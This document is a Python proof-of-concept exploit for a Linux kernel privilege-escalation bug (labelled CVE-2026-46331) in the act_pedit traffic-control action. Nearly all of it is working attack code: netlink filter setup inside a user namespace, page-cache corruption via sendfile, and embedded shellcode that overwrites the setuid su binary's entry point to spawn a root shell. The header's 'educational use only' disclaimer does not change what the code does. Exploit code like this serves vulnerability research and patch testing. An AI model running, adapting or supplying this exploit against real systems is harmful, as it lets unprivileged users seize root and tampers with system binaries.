#!/usr/bin/env python3
"""
CVE-2026-46331 -- Linux kernel net/sched act_pedit partial COW page cache corruption
Local Privilege Escalation PoC

Author: Ashraf Zaryouh "0xBlackash" (Python port)
Based on public research and sgkdev's packet_edit_meme
WARNING: For educational and authorized testing purposes only.
Do not use on systems you do not own.
"""

import os
import sys
import socket
import struct
import fcntl
import time
import errno
from typing import Optional, List, Tuple

# Constants
PEDIT_SLOT = 4
PEDIT_MAX_WRITE = 36
IP_IHL_KEY_OFFSET = 0
IP_IHL_KEY_VALUE = 0x4f
IP_IHL_KEY_MASK = 0xffffff00
MAX_PEDIT_KEYS = 1 + PEDIT_MAX_WRITE // PEDIT_SLOT
LOOPBACK_ADDR = 0x7f000001
LOOPBACK_PREFIX = 8
LOOPBACK_PORT = 4445
LISTEN_BACKLOG = 8
SETTLE_USEC = 250000
CALIB_PATH = "/tmp/.pedit_calib"
CALIB_LEN = 4096
CALIB_PROBE_OFFSET = 512
CALIB_MARK_BYTE = 0xcc
REQUEST_BUF_LEN = 8192
REPLY_BUF_LEN = 4096
FILTER_PRIO = 1
ACTION_LIST_FIRST = 1
MIN_DATA_PKT_LEN = 100

# Netlink constants
NLA_F_NESTED = 1 << 15
TC_H_CLSACT = 0xFFFF0000
TC_H_MIN_EGRESS = 0xFFF3
TC_ACT_PIPE = 3
TCA_MATCHALL_ACT = 2

# Socket constants
NETLINK_ROUTE = 0
RTM_NEWLINK = 16
RTM_NEWADDR = 20
RTM_DELQDISC = 38
RTM_NEWQDISC = 36
RTM_NEWTFILTER = 44
NLM_F_REQUEST = 1
NLM_F_ACK = 4
NLM_F_CREATE = 0x400
NLM_F_EXCL = 0x200
NLM_F_REPLACE = 0x100
IFA_LOCAL = 2
IFA_ADDRESS = 3
TCA_KIND = 1
TCA_OPTIONS = 2
TCA_BASIC_EMATCHES = 3
TCA_BASIC_ACT = 4
TCA_ACT_KIND = 1
TCA_ACT_OPTIONS = 2
TCA_PEDIT_PARMS_EX = 4
TCA_PEDIT_KEYS_EX = 5
TCA_PEDIT_KEY_EX = 1
TCA_PEDIT_KEY_EX_HTYPE = 1
TCA_PEDIT_KEY_EX_CMD = 2
TCA_EMATCH_TREE_HDR = 1
TCA_EMATCH_TREE_LIST = 2
TCA_EM_META_HDR = 1
TCA_EM_META_RVALUE = 3
TCF_EM_META = 4
TCF_EM_REL_END = 0
TCF_EM_OPND_GT = 3
TCA_PEDIT_KEY_EX_HDR_TYPE_NETWORK = 4
TCA_PEDIT_KEY_EX_HDR_TYPE_TCP = 6
TCA_PEDIT_KEY_EX_CMD_SET = 0

# Elf constants
ELFCLASS64 = 2
PT_LOAD = 1
PF_X = 1

# Shellcode
SHELLCODE_PAD = 0x90
SHELLCODE = bytes([
    0x31, 0xff, 0xb8, 0x6a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xb8, 0x69, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
    0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05,
    SHELLCODE_PAD, SHELLCODE_PAD, SHELLCODE_PAD,
])

SU_PATHS = ["/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su"]

# Netlink message structures (for reference)
NLMSG_HDRLEN = 16  # sizeof(struct nlmsghdr)
RTA_LENGTH = 4     # sizeof(struct rtattr)

class NetlinkSocket:
    def __init__(self):
        self.fd = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_ROUTE)
        self.seq = 1
        self.request_buf = bytearray(REQUEST_BUF_LEN)
        
    def request_begin(self, type_: int, flags: int) -> None:
        """Begin a netlink request"""
        self.request_buf = bytearray(REQUEST_BUF_LEN)
        hdr = struct.pack("=IHHII", 
                         NLMSG_HDRLEN,      # nlmsg_len
                         type_,             # nlmsg_type
                         NLM_F_REQUEST | NLM_F_ACK | flags,  # nlmsg_flags
                         self.seq,          # nlmsg_seq
                         0)                 # nlmsg_pid
        self.request_buf[:NLMSG_HDRLEN] = hdr
        self.seq += 1
        
    def request_reserve(self, length: int) -> int:
        """Reserve space in the request buffer"""
        hdr = struct.unpack("=IHHII", self.request_buf[:NLMSG_HDRLEN])
        new_len = hdr[0] + length
        self.request_buf[:NLMSG_HDRLEN] = struct.pack("=IHHII",
            new_len, hdr[1], hdr[2], hdr[3], hdr[4])
        return hdr[0]
        
    def request_append(self, data: bytes) -> None:
        """Append data to the request"""
        offset = self.request_reserve(len(data))
        self.request_buf[offset:offset+len(data)] = data
        
    def request_attr(self, type_: int, data: bytes) -> None:
        """Append a netlink attribute"""
        attr_len = RTA_LENGTH + len(data)
        self.request_append(struct.pack("=HH", attr_len, type_))
        self.request_append(data)
        
    def request_attr_str(self, type_: int, text: str) -> None:
        """Append a string attribute"""
        self.request_attr(type_, text.encode() + b'\x00')
        
    def request_nest_begin(self, type_: int) -> int:
        """Begin a nested attribute"""
        offset = len(self.request_buf)
        self.request_append(struct.pack("=HH", 0, type_ | NLA_F_NESTED))
        return offset
        
    def request_nest_end(self, offset: int) -> None:
        """End a nested attribute"""
        hdr = struct.unpack("=HH", self.request_buf[offset:offset+4])
        new_len = len(self.request_buf) - offset
        self.request_buf[offset:offset+4] = struct.pack("=HH", new_len, hdr[1])
        
    def request_blob_begin(self, type_: int) -> int:
        """Begin a blob attribute"""
        offset = len(self.request_buf)
        self.request_append(struct.pack("=HH", 0, type_))
        return offset
        
    def request_blob_end(self, offset: int) -> None:
        """End a blob attribute"""
        hdr = struct.unpack("=HH", self.request_buf[offset:offset+4])
        new_len = len(self.request_buf) - offset
        self.request_buf[offset:offset+4] = struct.pack("=HH", new_len, hdr[1])
        
    def request_send(self, allow_enoent: bool = False) -> int:
        """Send the request and wait for reply"""
        hdr = struct.unpack("=IHHII", self.request_buf[:NLMSG_HDRLEN])
        self.fd.send(self.request_buf[:hdr[0]])
        
        reply = self.fd.recv(REPLY_BUF_LEN)
        if len(reply) < NLMSG_HDRLEN:
            return -1
            
        reply_hdr = struct.unpack("=IHHII", reply[:NLMSG_HDRLEN])
        if reply_hdr[1] != 0x2:  # NLMSG_ERROR
            return 0
            
        error = struct.unpack("=i", reply[NLMSG_HDRLEN:NLMSG_HDRLEN+4])[0]
        if error != 0 and not (allow_enoent and error == -errno.ENOENT):
            return error
        return 0

class PeditExploit:
    def __init__(self):
        self.netlink = NetlinkSocket()
        self.loopback_index = 0
        self.listen_fd = None
        self.offset_delta = 0
        self.use_matchall = False
        
    def link_up(self, index: int) -> int:
        """Bring up a network interface"""
        self.netlink.request_begin(RTM_NEWLINK, 0)
        msg = struct.pack("=BBhhI", 
                         socket.AF_UNSPEC,  # ifi_family
                         0,                 # ifi_pad
                         index,             # ifi_index
                         0,                 # ifi_flags
                         0)                 # ifi_change
        self.netlink.request_append(msg)
        return self.netlink.request_send()
        
    def link_set_addr(self, index: int, addr: int) -> int:
        """Set IP address on interface"""
        self.netlink.request_begin(RTM_NEWADDR, NLM_F_CREATE | NLM_F_REPLACE)
        addr_be = socket.htonl(addr)
        msg = struct.pack("=BBhhII",
                         socket.AF_INET,    # ifa_family
                         0,                 # ifa_prefixlen
                         0,                 # ifa_flags
                         0,                 # ifa_scope
                         index,             # ifa_index
                         0)                 # ifa_pad
        self.netlink.request_append(msg)
        self.netlink.request_attr(IFA_LOCAL, struct.pack("=I", addr_be))
        self.netlink.request_attr(IFA_ADDRESS, struct.pack("=I", addr_be))
        return self.netlink.request_send()
        
    def clsact_delete(self, index: int) -> None:
        """Delete clsact qdisc"""
        self.netlink.request_begin(RTM_DELQDISC, 0)
        msg = struct.pack("=BBhhII",
                         socket.AF_UNSPEC,  # tcm_family
                         0,                 # tcm_pad
                         index,             # tcm_ifindex
                         0,                 # tcm_handle (TC_H_MAKE)
                         TC_H_CLSACT,       # tcm_parent
                         0)                 # tcm_info
        self.netlink.request_append(msg)
        self.netlink.request_send(allow_enoent=True)
        
    def clsact_add(self, index: int) -> int:
        """Add clsact qdisc"""
        self.netlink.request_begin(RTM_NEWQDISC, NLM_F_CREATE | NLM_F_EXCL)
        msg = struct.pack("=BBhhII",
                         socket.AF_UNSPEC,
                         0,
                         index,
                         0,
                         TC_H_CLSACT,
                         0)
        self.netlink.request_append(msg)
        self.netlink.request_attr_str(TCA_KIND, "clsact")
        return self.netlink.request_send()
        
    def append_pktlen_ematch(self, threshold: int) -> None:
        """Append packet length ematch"""
        ematches = self.netlink.request_nest_begin(TCA_BASIC_EMATCHES)
        
        tree_header = struct.pack("=III", 1, 0, 0)  # nmatches, progid, hdrlen
        self.netlink.request_attr(TCA_EMATCH_TREE_HDR, tree_header)
        
        match_list = self.netlink.request_nest_begin(TCA_EMATCH_TREE_LIST)
        match = self.netlink.request_blob_begin(1)
        
        match_header = struct.pack("=HHII", TCF_EM_META, TCF_EM_REL_END, 0, 0)
        self.netlink.request_append(match_header)
        
        # Meta header
        meta = struct.pack("=HHHHHH",
                          0x1009,  # kind (INT << 12 | PKTLEN)
                          0,       # shift
                          3,       # op (GT)
                          0x1000,  # kind (INT << 12 | VALUE)
                          0,       # shift
                          0)       # op
        self.netlink.request_attr(TCA_EM_META_HDR, meta)
        self.netlink.request_attr(TCA_EM_META_RVALUE, struct.pack("=I", threshold))
        
        self.netlink.request_blob_end(match)
        self.netlink.request_nest_end(match_list)
        self.netlink.request_nest_end(ematches)
        
    def append_pedit_action(self, keys: List[Tuple[int, int, int, int]]) -> None:
        """Append pedit action"""
        action = self.netlink.request_nest_begin(ACTION_LIST_FIRST)
        self.netlink.request_attr_str(TCA_ACT_KIND, "pedit")
        action_options = self.netlink.request_nest_begin(TCA_ACT_OPTIONS)
        
        # Build selector
        # struct tc_pedit_sel + keys * struct tc_pedit_key
        selector_len = 16 + len(keys) * 12
        selector = bytearray(selector_len)
        struct.pack_into("=HBBii", selector, 0, len(keys), 0, 0, TC_ACT_PIPE, 0)
        
        for i, (offset, value, mask, htype) in enumerate(keys):
            off = 16 + i * 12
            struct.pack_into("=IHHI", selector, off, offset, value, mask, 0)
            
        self.netlink.request_attr(TCA_PEDIT_PARMS_EX, bytes(selector))
        
        keys_ex = self.netlink.request_nest_begin(TCA_PEDIT_KEYS_EX)
        for i, (offset, value, mask, htype) in enumerate(keys):
            key_ex = self.netlink.request_nest_begin(TCA_PEDIT_KEY_EX)
            self.netlink.request_attr(TCA_PEDIT_KEY_EX_HTYPE, struct.pack("=H", htype))
            self.netlink.request_attr(TCA_PEDIT_KEY_EX_CMD, struct.pack("=H", TCA_PEDIT_KEY_EX_CMD_SET))
            self.netlink.request_nest_end(key_ex)
        self.netlink.request_nest_end(keys_ex)
        
        self.netlink.request_nest_end(action_options)
        self.netlink.request_nest_end(action)
        
    def egress_pedit_add(self, index: int, keys: List[Tuple[int, int, int, int]]) -> int:
        """Add egress pedit filter"""
        self.netlink.request_begin(RTM_NEWTFILTER, NLM_F_CREATE | NLM_F_EXCL)
        
        # TC_H_MAKE(TC_H_CLSACT, TC_H_MIN_EGRESS)
        handle = (TC_H_CLSACT & 0xFFFF0000) | (TC_H_MIN_EGRESS & 0xFFFF)
        
        msg = struct.pack("=BBhhII",
                         socket.AF_UNSPEC,
                         0,
                         index,
                         handle,
                         0,
                         (FILTER_PRIO << 16) | socket.htons(0x0003))  # ETH_P_ALL
        self.netlink.request_append(msg)
        
        if self.use_matchall:
            self.netlink.request_attr_str(TCA_KIND, "matchall")
            options = self.netlink.request_nest_begin(TCA_OPTIONS)
            action_list = self.netlink.request_nest_begin(TCA_MATCHALL_ACT)
        else:
            self.netlink.request_attr_str(TCA_KIND, "basic")
            options = self.netlink.request_nest_begin(TCA_OPTIONS)
            self.append_pktlen_ematch(MIN_DATA_PKT_LEN)
            action_list = self.netlink.request_nest_begin(TCA_BASIC_ACT)
            
        self.append_pedit_action(keys)
        self.netlink.request_nest_end(action_list)
        self.netlink.request_nest_end(options)
        
        return self.netlink.request_send()
        
    def fill_ihl_key(self) -> Tuple[int, int, int, int]:
        """Create IHL key"""
        return (IP_IHL_KEY_OFFSET, IP_IHL_KEY_VALUE, IP_IHL_KEY_MASK, TCA_PEDIT_KEY_EX_HDR_TYPE_NETWORK)
        
    def pedit_burst(self, fd: int, keys: List[Tuple[int, int, int, int]]) -> int:
        """Execute pedit burst operation"""
        # Get file size
        stat = os.fstat(fd)
        size = stat.st_size
        
        self.clsact_delete(self.loopback_index)
        if self.clsact_add(self.loopback_index):
            return -1
            
        # Setup TCP connection
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        client.connect((socket.inet_ntoa(struct.pack("=I", LOOPBACK_ADDR)), LOOPBACK_PORT))
        
        server, addr = self.listen_fd.accept()
        
        if self.egress_pedit_add(self.loopback_index, keys):
            client.close()
            server.close()
            return -1
            
        # Send file
        fcntl.fcntl(client.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)
        try:
            os.sendfile(client.fileno(), fd, 0, size)
        except OSError as e:
            if e.errno != errno.EAGAIN:
                client.close()
                server.close()
                return -1
                
        time.sleep(SETTLE_USEC / 1000000.0)
        client.close()
        server.close()
        return 0
        
    def calibrate(self) -> int:
        """Calibrate offset delta"""
        fd = os.open(CALIB_PATH, os.O_RDWR | os.O_CREAT | os.O_TRUNC, 0o644)
        if fd < 0:
            return -1
            
        try:
            os.write(fd, b'\x00' * CALIB_LEN)
            os.fsync(fd)
            
            mark_value = CALIB_MARK_BYTE | (CALIB_MARK_BYTE << 8) | (CALIB_MARK_BYTE << 16) | (CALIB_MARK_BYTE << 24)
            keys = [
                self.fill_ihl_key(),
                (CALIB_PROBE_OFFSET, mark_value, 0, TCA_PEDIT_KEY_EX_HDR_TYPE_TCP)
            ]
            
            if self.pedit_burst(fd, keys):
                os.close(fd)
                return -1
                
            # Read back and check
            os.lseek(fd, 0, os.SEEK_SET)
            buf = os.read(fd, CALIB_LEN)
            if len(buf) != CALIB_LEN:
                os.close(fd)
                return -1
                
            landed = -1
            for i in range(CALIB_LEN - PEDIT_SLOT + 1):
                if (buf[i] == CALIB_MARK_BYTE and
                    buf[i+1] == CALIB_MARK_BYTE and
                    buf[i+2] == CALIB_MARK_BYTE and
                    buf[i+3] == CALIB_MARK_BYTE):
                    landed = i
                    break
                    
            if landed < 0:
                os.close(fd)
                return -1
                
            self.offset_delta = landed - CALIB_PROBE_OFFSET
            os.close(fd)
            os.unlink(CALIB_PATH)
            return 0
            
        except Exception:
            os.close(fd)
            os.unlink(CALIB_PATH)
            return -1
            
    def setup(self) -> int:
        """Initialize exploit environment"""
        self.netlink = NetlinkSocket()
        
        try:
            self.loopback_index = socket.if_nametoindex("lo")
        except:
            return -1
            
        if not self.loopback_index or self.link_up(self.loopback_index):
            return -1
            
        self.link_set_addr(self.loopback_index, LOOPBACK_ADDR)
        
        # Setup listen socket
        self.listen_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen_fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listen_fd.bind((socket.inet_ntoa(struct.pack("=I", LOOPBACK_ADDR)), LOOPBACK_PORT))
        self.listen_fd.listen(LISTEN_BACKLOG)
        
        # Calibrate
        if self.calibrate() == 0:
            return 0
            
        self.use_matchall = True
        return self.calibrate()
        
    def api_fd_write(self, fd: int, offset: int, data: bytes) -> int:
        """Write data to file descriptor using pedit"""
        if len(data) == 0:
            return 0
        if len(data) > PEDIT_MAX_WRITE or (len(data) % PEDIT_SLOT) != 0:
            return -1
        if offset < self.offset_delta:
            return -1
            
        keys = [self.fill_ihl_key()]
        
        for i in range(0, len(data), PEDIT_SLOT):
            chunk = data[i:i+PEDIT_SLOT]
            if len(chunk) < PEDIT_SLOT:
                chunk += b'\x00' * (PEDIT_SLOT - len(chunk))
            value = struct.unpack("=I", chunk)[0]
            keys.append((
                offset + i - self.offset_delta,
                value,
                0,
                TCA_PEDIT_KEY_EX_HDR_TYPE_TCP
            ))
            
        return self.pedit_burst(fd, keys)

def find_su() -> Optional[str]:
    """Find setuid root su binary"""
    for path in SU_PATHS:
        try:
            st = os.stat(path)
            if (st.st_mode & 0o4000) and st.st_uid == 0:
                return path
        except:
            continue
    return None

def elf_entry_offset(fd: int) -> int:
    """Find entry point offset in ELF binary"""
    # Read ELF header
    ehdr = os.pread(fd, 64, 0)
    if len(ehdr) < 64 or ehdr[4] != 2:  # ELFCLASS64
        return -1
        
    # Parse ELF header
    e_phoff = struct.unpack("<Q", ehdr[32:40])[0]
    e_phentsize = struct.unpack("<H", ehdr[54:56])[0]
    e_phnum = struct.unpack("<H", ehdr[56:58])[0]
    e_entry = struct.unpack("<Q", ehdr[24:32])[0]
    
    # Find loadable executable segment containing entry
    for i in range(e_phnum):
        phdr = os.pread(fd, 56, e_phoff + i * e_phentsize)
        if len(phdr) < 56:
            continue
            
        p_type = struct.unpack("<I", phdr[0:4])[0]
        p_flags = struct.unpack("<I", phdr[4:8])[0]
        p_vaddr = struct.unpack("<Q", phdr[16:24])[0]
        p_filesz = struct.unpack("<Q", phdr[32:40])[0]
        p_offset = struct.unpack("<Q", phdr[8:16])[0]
        
        if p_type == PT_LOAD and (p_flags & PF_X):
            if p_vaddr <= e_entry < p_vaddr + p_filesz:
                return e_entry - p_vaddr + p_offset
                
    return -1

def write_proc_file(path: str, value: str) -> None:
    """Write to a proc file"""
    try:
        with open(path, 'w') as f:
            f.write(value)
    except:
        pass

def corrupt_entry(su_fd: int, entry_offset: int) -> int:
    """Corrupt su binary entry point"""
    # Unshare user namespace
    try:
        os.unshare(0x02000000 | 0x04000000)  # CLONE_NEWUSER | CLONE_NEWNET
    except:
        return -1
        
    write_proc_file("/proc/self/setgroups", "deny")
    uid = os.getuid()
    gid = os.getgid()
    write_proc_file("/proc/self/uid_map", f"0 {uid} 1")
    write_proc_file("/proc/self/gid_map", f"0 {gid} 1")
    
    exploit = PeditExploit()
    if exploit.setup():
        return -1
        
    written = 0
    while written < len(SHELLCODE):
        chunk = min(len(SHELLCODE) - written, PEDIT_MAX_WRITE)
        if exploit.api_fd_write(su_fd, entry_offset + written, SHELLCODE[written:written+chunk]):
            return -1
        written += chunk
        
    return 0

def run_exploit() -> int:
    """Main exploit function"""
    if os.geteuid() == 0:
        print("[-] Run as unprivileged user")
        return 1
        
    print("CVE-2026-46331 PoC by Ashraf Zaryouh \"0xBlackash\" (Python port)")
    
    su_path = find_su()
    if not su_path:
        print("[-] no setuid-root su found")
        return 1
        
    try:
        su_fd = os.open(su_path, os.O_RDONLY)
    except Exception as e:
        print(f"[-] open su failed: {e}")
        return 1
        
    entry_offset = elf_entry_offset(su_fd)
    if entry_offset < 0:
        print("[-] could not locate su entry point")
        os.close(su_fd)
        return 1
        
    print(f"[*] target {su_path} entry at 0x{entry_offset:x}")
    
    # Fork and corrupt
    r, w = os.pipe()
    child = os.fork()
    
    if child == 0:
        os.close(r)
        try:
            result = corrupt_entry(su_fd, entry_offset)
        except Exception as e:
            print(f"[-] corruption failed: {e}", file=sys.stderr)
            os.close(w)
            sys.exit(1)
            
        if result == 0:
            os.write(w, b'1')
        else:
            os.write(w, b'0')
        os.close(w)
        sys.exit(0)
    else:
        os.close(w)
        ack = os.read(r, 1)
        os.close(r)
        _, status = os.waitpid(child, 0)
        
        os.close(su_fd)
        
        if ack != b'1' or not os.WIFEXITED(status) or os.WEXITSTATUS(status) != 0:
            print("[-] corruption failed")
            return 1
            
        print("[+] Corruption successful. Executing su for root shell...")
        try:
            os.execve(su_path, [su_path], os.environ)
        except Exception as e:
            print(f"[-] execve failed: {e}")
            return 1
        
        return 0

if __name__ == "__main__":
    sys.exit(run_exploit())
